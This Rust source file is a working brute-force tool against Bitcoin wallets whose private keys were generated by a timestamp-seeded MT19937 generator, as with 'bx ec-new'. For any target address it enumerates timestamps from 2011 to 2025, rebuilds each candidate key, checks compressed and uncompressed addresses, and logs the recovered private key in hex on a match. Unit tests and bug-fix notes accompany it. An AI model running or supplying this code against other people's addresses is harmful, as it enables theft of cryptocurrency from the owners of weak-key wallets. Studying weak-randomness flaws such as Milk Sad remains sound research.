use anyhow::{anyhow, Result};
use bitcoin::secp256k1::{PublicKey, Secp256k1, SecretKey};
use bitcoin::{Address, CompressedPublicKey, Network};
use tracing::{info, warn};

/// Generic "Ec-New" Scanner
/// Vulnerability: Private key generated directly from PRNG (MT19937) seeded with timestamp
/// Similar to Milk Sad, but without BIP39 mnemonic step.
/// Use: bx ec-new (with weak RNG)
///
/// Bugs fixed:
/// 1. CRITICAL — MSB extraction: bx ec-new calls next_u32() once per OUTPUT BYTE
///    and takes only the most-significant byte (val >> 24).  The old code called
///    next_u32() once per 4-byte group and used all 4 bytes — producing a completely
///    different 32-byte key than the real tool.  (compare milk_sad::generate_entropy_msb)
/// 2. Uncompressed P2PKH: real bx pipelines often produced uncompressed keys.
///    Both compressed and uncompressed addresses are now checked.
/// 3. start > end panic: `end - start` on u32 underflowed.  Guard added.
/// 4. Minor: `checked` now increments regardless of SecretKey validity.
pub fn run(target_address: &str, start_ts: Option<u32>, end_ts: Option<u32>) -> Result<()> {
    info!("Running EC-New (Direct PRNG) Vulnerability Scanner...");

    let start = start_ts.unwrap_or(1_300_000_000);
    let end   = end_ts.unwrap_or(1_735_689_600); // Jan 1 2025

    // FIX 3: guard against u32 underflow.
    if end < start {
        anyhow::bail!("--end ({}) must be >= --start ({})", end, start);
    }

    info!("Target: {}", target_address);
    info!("Time range: {} to {} ({} seconds)", start, end, end - start);

    let secp    = Secp256k1::new();
    let network = Network::Bitcoin;

    let target_addr_obj = target_address
        .parse::<Address<_>>()
        .map_err(|e| anyhow!("Invalid target address: {}", e))?
        .require_network(network)?;

    let mut found   = false;
    let start_time  = std::time::Instant::now();
    let mut checked = 0u64;

    'outer: for t in start..=end {
        // FIX 1: MSB-only extraction — one next_u32() per output byte, matching bx ec-new.
        let entropy_32 = generate_mt19937_32bytes_msb(t);

        if let Ok(sk) = SecretKey::from_slice(&entropy_32) {
            let pk = PublicKey::from_secret_key(&secp, &sk);

            // FIX 2: check compressed P2PKH (standard) and uncompressed P2PKH.
            // bx ec-new pipelines sometimes imported keys without the compression
            // flag, producing a different hash160 and a different address.
            let addr_c = Address::p2pkh(CompressedPublicKey(pk), network);

            // bitcoin::PublicKey wraps secp256k1::PublicKey; passing it to p2pkh
            // hashes the 65-byte uncompressed serialisation (0x04 || x || y).
            let addr_u = Address::p2pkh(
                bitcoin::PublicKey { inner: pk, compressed: false },
                network,
            );

            for addr in [&addr_c, &addr_u] {
                if *addr == target_addr_obj {
                    warn!("\n\u{1f3af} FOUND MATCH!");
                    warn!("Timestamp:   {}", t);
                    warn!("Private Key: {}", hex::encode(entropy_32));
                    warn!("Address:     {}", addr);
                    warn!("Compressed:  {}", addr == &addr_c);
                    found = true;
                    break 'outer;
                }
            }
        }

        // FIX 4: count every timestamp regardless of SecretKey validity.
        checked += 1;
        if checked % 1_000_000 == 0 {
            let elapsed = start_time.elapsed().as_secs_f64();
            info!(
                "Checked {} timestamps ({:.2} M/s)",
                checked,
                checked as f64 / elapsed / 1_000_000.0
            );
        }
    }

    if found {
        info!("Scan complete. VULNERABILITY FOUND.");
    } else {
        info!("Scan complete. No match found in range.");
    }

    Ok(())
}

/// Generate 32 bytes from MT19937 seeded with `seed` using MSB-only extraction:
///   for each output byte: val = next_u32(); byte = (val >> 24) as u8
/// 32 calls to next_u32() total.  Matches libbitcoin `pseudo_random_seed` / bx ec-new.
fn generate_mt19937_32bytes_msb(seed: u32) -> [u8; 32] {
    let mut mt = Mt19937::new(seed);
    let mut bytes = [0u8; 32];
    for byte in bytes.iter_mut() {
        let val = mt.next_u32();
        *byte = (val >> 24) as u8;
    }
    bytes
}

struct Mt19937 {
    mt:    [u32; 624],
    index: usize,
}

impl Mt19937 {
    fn new(seed: u32) -> Self {
        let mut mt = [0u32; 624];
        mt[0] = seed;
        for i in 1..624 {
            let prev = mt[i - 1];
            mt[i] = (1_812_433_253u64 * (prev ^ (prev >> 30)) as u64 + i as u64) as u32;
        }
        Self { mt, index: 624 }
    }

    fn next_u32(&mut self) -> u32 {
        if self.index >= 624 {
            self.twist();
        }
        let mut y = self.mt[self.index];
        self.index += 1;

        y ^= y >> 11;
        y ^= (y << 7)  & 0x9d2c5680;
        y ^= (y << 15) & 0xefc60000;
        y ^= y >> 18;
        y
    }

    fn twist(&mut self) {
        for i in 0..624 {
            let y = (self.mt[i] & 0x80000000) + (self.mt[(i + 1) % 624] & 0x7fffffff);
            self.mt[i] = self.mt[(i + 397) % 624] ^ (y >> 1);
            if y % 2 != 0 {
                self.mt[i] ^= 0x9908b0df;
            }
        }
        self.index = 0;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Cross-validate MSB extraction against the milk_sad GPU test-vector suite.
    /// Both scanners must produce identical bytes for the same timestamp.
    #[test]
    fn test_msb_extraction_matches_milk_sad_reference() {
        let expected_hex = "9e695582572b97ff9774a5662626e42fe380c48c3b810f33e4437d216e8b2bab";
        let got = generate_mt19937_32bytes_msb(1_234_567_890);
        assert_eq!(hex::encode(got), expected_hex,
            "MSB extraction must match milk_sad reference for ts=1234567890");
    }

    /// Regression: old 8-call full-word extraction must differ from correct MSB extraction.
    #[test]
    fn test_old_extraction_was_wrong() {
        fn old_wrong(seed: u32) -> [u8; 32] {
            let mut mt = Mt19937::new(seed);
            let mut bytes = [0u8; 32];
            for i in 0..8 {
                let val = mt.next_u32();
                bytes[i * 4]     = (val >> 24) as u8;
                bytes[i * 4 + 1] = (val >> 16) as u8;
                bytes[i * 4 + 2] = (val >>  8) as u8;
                bytes[i * 4 + 3] =  val        as u8;
            }
            bytes
        }
        let seed = 1_400_000_000u32;
        assert_ne!(old_wrong(seed), generate_mt19937_32bytes_msb(seed));
    }

    /// FIX 3: start > end must return Err, not panic.
    #[test]
    fn test_start_greater_than_end_returns_err() {
        let result = run("1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf",
            Some(1_700_000_000), Some(1_400_000_000));
        assert!(result.is_err(), "start > end must return Err");
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("end") && msg.contains(">="),
            "Error message should mention 'end' and '>=', got: {}", msg);
    }

    /// Canonical MT19937 sanity check.
    #[test]
    fn test_mt19937_first_output_seed0() {
        let mut mt = Mt19937::new(0);
        assert_eq!(mt.next_u32(), 2_357_136_044u32);
    }
}
